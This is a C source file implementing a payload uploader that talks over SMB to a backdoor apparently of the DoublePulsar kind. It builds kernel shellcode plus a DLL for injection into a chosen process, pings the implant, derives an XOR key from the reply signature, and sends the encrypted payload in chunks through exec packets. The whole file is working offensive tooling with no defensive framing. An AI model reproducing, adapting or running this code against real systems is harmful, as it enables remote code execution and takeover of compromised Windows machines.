#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > (size_t)INT_MAX ? INT_MAX : (int)(length - sent);
        int result = send(sock, (const char *)data + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > (size_t)INT_MAX ? INT_MAX : (int)(length - received);
        int result = recv(sock, (char *)data + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int upload_recv_smb_frame(SOCKET sock, uint8_t **frame, size_t *frame_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *buffer;

    if (upload_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if ((size_t)body_length > SIZE_MAX - sizeof(header))
        return -1;

    buffer = (uint8_t *)malloc(sizeof(header) + (size_t)body_length);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(sock, buffer + sizeof(header), (size_t)body_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + (size_t)body_length;
    return 0;
}

static uint16_t upload_read_le16(const uint8_t *p)
{
    return (uint16_t)((uint16_t)p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t upload_read_le32(const uint8_t *p)
{
    return (uint32_t)p[0] |
           ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) |
           ((uint32_t)p[3] << 24);
}

static void upload_write_le16(uint8_t *p, uint16_t value)
{
    p[0] = (uint8_t)value;
    p[1] = (uint8_t)(value >> 8);
}

static void upload_write_le32(uint8_t *p, uint32_t value)
{
    p[0] = (uint8_t)value;
    p[1] = (uint8_t)(value >> 8);
    p[2] = (uint8_t)(value >> 16);
    p[3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    uint8_t *packet = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    size_t offset;
    size_t packet_length;
    size_t packet_template_length;
    SOCKET sock = INVALID_SOCKET;
    WSADATA wsa_data;
    int wsa_started = 0;
    int result = -1;
    struct sockaddr_in address;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t signature;
    uint32_t key;
    uint32_t inject_hash = 0;
    size_t name_length;
    size_t i;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX ||
        (uint64_t)file_size.QuadPart > UINT32_MAX)
        goto cleanup;

    dll_size = (size_t)file_size.QuadPart;
    if (dll_size == 0 || dll_size > SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE)
        goto cleanup;

    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size > UINT32_MAX || dll_size > UINT32_MAX - 3978U)
        goto cleanup;

    dll = (uint8_t *)malloc(dll_size);
    payload = (uint8_t *)malloc(payload_size);
    if (dll == NULL || payload == NULL)
        goto cleanup;

    offset = 0;
    while (offset < dll_size) {
        DWORD amount = dll_size - offset > (size_t)MAXDWORD ?
                       MAXDWORD : (DWORD)(dll_size - offset);
        DWORD bytes_read = 0;
        if (!ReadFile(file, dll + offset, amount, &bytes_read, NULL) ||
            bytes_read == 0)
            goto cleanup;
        offset += (size_t)bytes_read;
    }

    {
        uint8_t extra;
        DWORD bytes_read = 0;
        if (!ReadFile(file, &extra, 1, &bytes_read, NULL) || bytes_read != 0)
            goto cleanup;
    }

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll, dll_size);

    if ((size_t)KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4 ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4 ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4 ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4)
        goto cleanup;

    upload_write_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET,
                      (uint32_t)(dll_size + 3978U));
    upload_write_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_size);
    upload_write_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1U);

    name_length = strlen(TARGET_INJECT_PROCESS);
    for (i = 0; i < name_length; ++i)
        inject_hash = inject_hash * 127U +
                      (uint32_t)(unsigned char)TARGET_INJECT_PROCESS[i];
    upload_write_le32(payload + KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;
    wsa_started = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;
    if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    if (upload_send_all(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_recv_smb_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_send_all(sock, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_recv_smb_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length <= 33)
        goto cleanup;
    user_id = upload_read_le16(response + 32);
    free(response);
    response = NULL;

    {
        uint8_t *tree_packet;
        size_t tree_packet_length = sizeof(SMB_TREE_CONNECT_PKT) - 1;

        tree_packet = (uint8_t *)malloc(tree_packet_length);
        if (tree_packet == NULL)
            goto cleanup;
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, tree_packet_length);
        if (tree_packet_length <= 33) {
            free(tree_packet);
            goto cleanup;
        }
        upload_write_le16(tree_packet + 32, user_id);

        if (upload_send_all(sock, tree_packet, tree_packet_length) != 0 ||
            upload_recv_smb_frame(sock, &response, &response_length) != 0) {
            free(tree_packet);
            goto cleanup;
        }
        free(tree_packet);
    }

    if (response_length <= 29)
        goto cleanup;
    tree_id = upload_read_le16(response + 28);
    free(response);
    response = NULL;

    {
        uint8_t *ping_packet;
        size_t ping_packet_length = sizeof(DP_PING_PKT) - 1;

        ping_packet = (uint8_t *)malloc(ping_packet_length);
        if (ping_packet == NULL)
            goto cleanup;
        memcpy(ping_packet, DP_PING_PKT, ping_packet_length);
        if (ping_packet_length <= 33) {
            free(ping_packet);
            goto cleanup;
        }
        upload_write_le16(ping_packet + 28, tree_id);
        upload_write_le16(ping_packet + 32, user_id);

        if (upload_send_all(sock, ping_packet, ping_packet_length) != 0 ||
            upload_recv_smb_frame(sock, &response, &response_length) != 0) {
            free(ping_packet);
            goto cleanup;
        }
        free(ping_packet);
    }

    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4)
        goto cleanup;

    signature = upload_read_le32(response + SMB_RESP_SIGNATURE_START);
    key = (2U * signature) ^
          ((((signature >> 16) | (signature & 0x00FF0000U)) >> 8) |
           (((signature << 16) | (signature & 0x0000FF00U)) << 8));
    free(response);
    response = NULL;

    xor_buffer(payload, payload_size, key);

    packet_template_length = (size_t)SMB_EXEC_TEMPLATE_LEN;
    if (packet_template_length != 70 || payload_size == 0)
        goto cleanup;

    for (offset = 0; offset < payload_size; offset += (size_t)SMB_EXEC_SHELLCODE_LEN) {
        size_t chunk_size = payload_size - offset;
        uint8_t parameters[12];
        uint32_t total_value = (uint32_t)payload_size;
        uint32_t chunk_value;
        uint32_t offset_value = (uint32_t)offset;
        uint8_t *chunk_response = NULL;
        size_t chunk_response_length = 0;

        if (chunk_size > (size_t)SMB_EXEC_SHELLCODE_LEN)
            chunk_size = (size_t)SMB_EXEC_SHELLCODE_LEN;
        if (chunk_size > UINT16_MAX || chunk_size > SIZE_MAX - packet_template_length - 12)
            goto cleanup;

        chunk_value = (uint32_t)chunk_size;
        upload_write_le32(parameters, total_value);
        upload_write_le32(parameters + 4, chunk_value);
        upload_write_le32(parameters + 8, offset_value);
        xor_buffer(parameters, sizeof(parameters), key);

        packet_length = packet_template_length + sizeof(parameters) + chunk_size;
        packet = (uint8_t *)malloc(packet_length);
        if (packet == NULL)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, packet_template_length);
        memcpy(packet + packet_template_length, parameters, sizeof(parameters));
        memcpy(packet + packet_template_length + sizeof(parameters),
               payload + offset, chunk_size);

        if ((size_t)SMB_NETBIOS_LEN_OFFSET > packet_length - 4 ||
            (size_t)SMB_EXEC_TOTAL_DATA_OFFSET > packet_length - 2 ||
            (size_t)SMB_EXEC_DATA_COUNT_OFFSET > packet_length - 2 ||
            (size_t)SMB_EXEC_BYTE_COUNT_OFFSET > packet_length - 2 ||
            (size_t)SMB_TID_OFFSET > packet_length - 2 ||
            (size_t)SMB_UID_OFFSET > packet_length - 2) {
            free(packet);
            packet = NULL;
            goto cleanup;
        }

        {
            uint32_t netbios_length =
                (uint32_t)(chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN + 12U - 4U);
            packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 24);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 16);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)(netbios_length >> 8);
            packet[SMB_NETBIOS_LEN_OFFSET + 3] = (uint8_t)netbios_length;
        }

        upload_write_le16(packet + SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk_size);
        upload_write_le16(packet + SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk_size);
        upload_write_le16(packet + SMB_EXEC_BYTE_COUNT_OFFSET,
                          (uint16_t)(chunk_size + sizeof(parameters)));
        upload_write_le16(packet + SMB_TID_OFFSET, tree_id);
        upload_write_le16(packet + SMB_UID_OFFSET, user_id);

        if (upload_send_all(sock, packet, packet_length) != 0 ||
            upload_recv_smb_frame(sock, &chunk_response, &chunk_response_length) != 0) {
            free(packet);
            packet = NULL;
            free(chunk_response);
            goto cleanup;
        }

        free(packet);
        packet = NULL;

        if (offset + chunk_size == payload_size) {
            if ((size_t)DP_RESP_MUX_ID_OFFSET >= chunk_response_length ||
                chunk_response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
                free(chunk_response);
                goto cleanup;
            }
            result = 0;
        }

        free(chunk_response);
    }

cleanup:
    if (packet != NULL)
        free(packet);
    if (response != NULL)
        free(response);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    free(dll);
    free(payload);
    return result;
}